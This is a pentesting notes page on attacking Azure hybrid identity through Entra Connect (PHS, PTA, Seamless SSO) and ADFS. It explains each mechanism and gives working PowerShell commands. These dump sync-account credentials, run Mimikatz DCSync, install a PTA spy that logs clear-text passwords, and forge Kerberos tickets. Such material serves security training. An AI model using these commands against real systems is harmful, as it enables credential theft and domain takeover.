---
title: Hybrid Identity
source_url: https://notes.incendium.rocks/pentesting-notes/cloud/azure/lateral-movement/hybrid-identity
fetched_at: 2026-09-20T01:23:21Z
license: unspecified
category: cloud
---

Organizations have resources, devices and applications both on-premises and in the cloud. Many enterprises se their on-prem AD identities to access Azure applications to avoid managing separate identities on both.&#x20;

A single user identity for authentication and authorization to all resources, regardless of location is a hybrid identity

### Entra Connect

An on-premises AD can be integrated with Entra ID using Entra Connect with the following methods. Every method supports Single Sign-on (SSO):

* Password Hash Sync (PHS)&#x20;
* Pass-Through Authentication (PTA)&#x20;
* Federation

<figure><img src="https://3347686964-files.gitbook.io/~/files/v0/b/gitbook-x-prod.appspot.com/o/spaces%2Fu7zwkkeRzjx9PZGhfY9D%2Fuploads%2FJwHBka4tQZFLtN8lfRyB%2Fsso1.png?alt=media&amp;token=7caa25eb-a72a-40f2-bd2e-75c4518c8b27" alt=""><figcaption></figcaption></figure>

### PHS (Password Hash Sync)

It syncs users and a hash of their password hashes (not clear-text or original hashes) for on-prem AD to Entra ID. This is the simplest and most popular method for getting a hybrid identity.&#x20;

PHS is required for features like identity protection and AAD domain services

By default, password expiry and account expiry are **not** reflected in Entra ID. That means a user whose on-prem password is expired, can continue to access Azure resources using the old password.

For on-prem an account with the name `MSOL_<installationID>`is automatically created. This account has replication (DCSync) permissions in the on-prem AD.

Enumerate MSOL users:

```powershell
Get-ADUser -Filter "samAccountName -like 'MSOL_*'" -Properties * | select SamAccountName,Description | fl
```

Once the Entra connect server is compromised. Use the below commands from the AADInternals module. Extract credentials of the MSOL\_\* and Sync\_\* accounts in clear text:

```powershell
Import-Module AADInternals\AADInternals.psd1

Get-AADIntSyncCredentials
```

Using the creds of MSOL\_\* account, we can run DCSync against the on- prem AD:

```powershell
runas /netonly /user:defeng.corp\MSOL_782bef6aa0a9 cmd Invoke-Mimikatz -Command '"lsadump::dcsync/user:defeng\krbtgt /domain:defeng.corp /dc:defeng-dc.defeng.corp"'
```

### PTA (Pass-through Authentication)

Microsoft Entra pass-through authentication allows your users to sign in to both on-premises and cloud-based applications using the same passwords. When users sign in using Microsoft Entra ID, this feature validates users' passwords directly against your on-premises Active Directory.

<figure><img src="https://3347686964-files.gitbook.io/~/files/v0/b/gitbook-x-prod.appspot.com/o/spaces%2Fu7zwkkeRzjx9PZGhfY9D%2Fuploads%2FvYVb2u58jr8XHC19UUsF%2Fpta1.png?alt=media&amp;token=9f0d557f-2e97-4228-b563-7432964775c2" alt=""><figcaption></figcaption></figure>

If we compromise a server with the authentication agent running, we can get the credentials for users in plain-text. We will first need to upload AADInternals.zip <https://github.com/Gerenios/AADInternals>. Next, unzip it and run :

```powershell
Import-Module AADInternals\AADInternals.psd1
```

Install the PTA agent and collect credentials.

```powershell
Install-AADIntPTASpy

All passwords are now accepted and credentials collected to
C:\PTASpy\PTASpy.csv

# Get clear-text passwords from users authenticating
Get-AADIntPTASpyLog
```

### Seamless SSO

Entra Seamless SSO automatically signs users in when they are on-prem domain-joined machine. There is no need to use passwords to log in to Entra ID and on-prem application. On on-prem AD a user `AZUREADSSOACC`Is created. This account's Kebreros decryption key is shared with entra ID.

Password/key of the AZUREADSSOACC never changes

This means that if we can compromise the NTLM hash of the machine account, we can create silver tickets for any synced on-prem user.

First get NTLM hash

```powershell
Invoke-Mimikatz -Command '"lsadump::dcsync /user:domain\azureadssoacc$ /domain:defeng.corp /dc:defeng-dc.defeng.corp"'
```

We just need the userPrincipalName and SID of the user to create the Silver ticket that can be used from any machine connected to the internet.&#x20;

Create silver ticket:

```powershell
Invoke-Mimikatz -Command '"kerberos::golden /user:onpremadmin1 /sid:S-1-5-21-938785110-3291390659-577725712 /id:1108 /domain:defeng.corp /rc4:<> /target:aadg.windows.net.nsatc.net /service:HTTP /ptt"'
```

### Federation

In case of `federation`a trust is established between unrelated parties like on-premise AD and Entra ID. Users can access cloud applications by using their on-prem credentials.

<figure><img src="https://3347686964-files.gitbook.io/~/files/v0/b/gitbook-x-prod.appspot.com/o/spaces%2Fu7zwkkeRzjx9PZGhfY9D%2Fuploads%2Fgo00Z6CSQVtfKUgZQ3S4%2Fimage.png?alt=media&amp;token=c8c840c5-ed1d-439e-950b-09841d3987b0" alt=""><figcaption></figcaption></figure>

### ADFS

AD FS is a claimed-based identity model. Claims are simply statements (for example name, identity, groupp), made about users that are used primarily for authorizing access to claim-based applications located anywhere on the internet.

<figure><img src="https://3347686964-files.gitbook.io/~/files/v0/b/gitbook-x-prod.appspot.com/o/spaces%2Fu7zwkkeRzjx9PZGhfY9D%2Fuploads%2FU2NYxkvvldEFcsS5rBGx%2Fadfs.png?alt=media&amp;token=e0f78615-dfd6-4965-8a42-14dd8bd14d1c" alt=""><figcaption></figcaption></figure>

A user is identified by ImmutableID. It is globally unique and stored in Entra ID. The ImmuatbleID is stored on-prem as `ms-DS-ConsistencyGuid`for the user and/or can be derived from the GUID of the user

### Golden SAML attack

In ADFS, A SAML response is signed by a token-signing certificate. If the certificate is compromised, it is possible to authenticate to the Entra ID as ANY user in Entra ID. The certificate can be extracted from the AD FS server with Domain Admin privileges and then can be used from the internet connectd machine.&#x20;

<figure><img src="https://3347686964-files.gitbook.io/~/files/v0/b/gitbook-x-prod.appspot.com/o/spaces%2Fu7zwkkeRzjx9PZGhfY9D%2Fuploads%2FLWkEaXgCFYTQGT5ecBzh%2F613398765c8d9758da030b06_5fe24c87f37f454ff3c46fd8_Golden-Advisory-image-2-border-1024x446.webp?alt=media&amp;token=a53da929-ac44-4922-b6a3-af393dc435a1" alt=""><figcaption></figcaption></figure>
